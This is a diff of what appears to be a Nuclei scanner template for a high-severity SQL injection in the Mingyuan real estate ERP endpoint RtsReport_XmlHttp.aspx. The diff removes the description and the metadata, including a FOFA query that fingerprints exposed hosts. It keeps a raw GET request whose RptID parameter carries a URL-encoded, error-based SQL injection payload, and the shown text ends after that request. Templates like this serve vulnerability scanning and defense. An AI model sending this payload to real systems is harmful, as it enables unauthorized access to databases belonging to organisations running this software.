@@ -3,12 +3,8 @@ info:
   name: 明源地产ERP RtsReport_XmlHttp.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/imp4gi3i5d2amxc1'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: imp4gi3i5d2amxc1
-    fofa: body="/_common/scripts/md5-min.js"
 http:
 - raw:
   - 'GET /Report/RtsReport_XmlHttp.aspx/?ywtype=SaveGeneralParam&RptID=1%27%2B(SELECT%20CHAR(65)%2BCHAR(119)%2BCHAR(102)%2BCHAR(103)%20WHERE%204294%3D4294%20AND%203472%20IN%20(SELECT%20(CHAR(113)%2BCHAR(107)%2BCHAR(106)%2BCHAR(113)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(3472%3D3472)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(107)%2BCHAR(98)%2BCHAR(118)%2BCHAR(113))))%2B%27 HTTP/1.1
